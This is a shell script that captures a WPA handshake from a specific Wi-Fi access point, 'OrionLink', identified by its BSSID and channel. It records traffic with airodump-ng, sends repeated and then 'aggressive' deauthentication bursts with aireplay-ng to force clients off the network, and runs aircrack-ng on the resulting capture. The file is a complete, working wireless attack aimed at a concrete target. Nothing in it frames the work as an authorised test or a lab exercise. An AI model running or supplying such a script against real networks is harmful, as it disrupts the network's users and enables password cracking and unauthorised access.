#!/bin/sh
# WPA Handshake Capture Script
# Target: OrionLink CC:28:AA:66:30:08, Channel 2
# Captures 4-way handshake via deauth + airodump-ng

IFACE="wlan1mon"
BSSID="CC:28:AA:66:30:08"
CHAN="2"
CAPFILE="/tmp/orionlink_hs"
LOG="/tmp/handshake_capture.log"

echo "=== WPA Handshake Capture ===" | tee "$LOG"
echo "Target: OrionLink ($BSSID) Ch$CHAN" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"

# Clean old capture files
rm -f ${CAPFILE}* 2>/dev/null

# Start airodump-ng in background capturing to file
echo "[*] Starting airodump-ng capture..." | tee -a "$LOG"
airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$CAPFILE" "$IFACE" > /tmp/airodump.out 2>&1 &
AIRO_PID=$!
echo "[*] airodump-ng PID: $AIRO_PID" | tee -a "$LOG"

# Wait for airodump to settle
sleep 5

# Send deauth bursts (3 rounds of 10 deauths each)
echo "[*] Sending deauth burst round 1..." | tee -a "$LOG"
aireplay-ng -0 10 -a "$BSSID" "$IFACE" >> "$LOG" 2>&1
sleep 10

echo "[*] Sending deauth burst round 2..." | tee -a "$LOG"
aireplay-ng -0 10 -a "$BSSID" "$IFACE" >> "$LOG" 2>&1
sleep 10

echo "[*] Sending deauth burst round 3..." | tee -a "$LOG"
aireplay-ng -0 10 -a "$BSSID" "$IFACE" >> "$LOG" 2>&1
sleep 15

# Check if handshake was captured
echo "[*] Checking for captured handshake..." | tee -a "$LOG"

# Kill airodump
kill "$AIRO_PID" 2>/dev/null
wait "$AIRO_PID" 2>/dev/null

# Look for capture file
CAP_FOUND=""
for f in ${CAPFILE}*.cap; do
    if [ -f "$f" ]; then
        CAP_FOUND="$f"
        SIZE=$(ls -la "$f" | awk '{print $5}')
        echo "[+] Capture file: $f ($SIZE bytes)" | tee -a "$LOG"
    fi
done

if [ -z "$CAP_FOUND" ]; then
    echo "[-] No capture file found!" | tee -a "$LOG"
    echo "[-] Retrying with longer capture window..." | tee -a "$LOG"

    # Second attempt with longer window
    airodump-ng -c "$CHAN" --bssid "$BSSID" -w "${CAPFILE}2" "$IFACE" > /tmp/airodump2.out 2>&1 &
    AIRO_PID=$!
    sleep 5

    # Aggressive deauth
    aireplay-ng -0 20 -a "$BSSID" "$IFACE" >> "$LOG" 2>&1
    sleep 20
    aireplay-ng -0 20 -a "$BSSID" "$IFACE" >> "$LOG" 2>&1
    sleep 30

    kill "$AIRO_PID" 2>/dev/null
    wait "$AIRO_PID" 2>/dev/null

    for f in ${CAPFILE}2*.cap; do
        if [ -f "$f" ]; then
            CAP_FOUND="$f"
            SIZE=$(ls -la "$f" | awk '{print $5}')
            echo "[+] Capture file (retry): $f ($SIZE bytes)" | tee -a "$LOG"
        fi
    done
fi

if [ -n "$CAP_FOUND" ]; then
    echo "[+] Capture complete: $CAP_FOUND" | tee -a "$LOG"
    echo "[*] Validating handshake with aircrack-ng..." | tee -a "$LOG"
    aircrack-ng "$CAP_FOUND" 2>&1 | tee -a "$LOG"
else
    echo "[-] FAILED: No capture file generated" | tee -a "$LOG"
fi

echo "Completed: $(date)" | tee -a "$LOG"
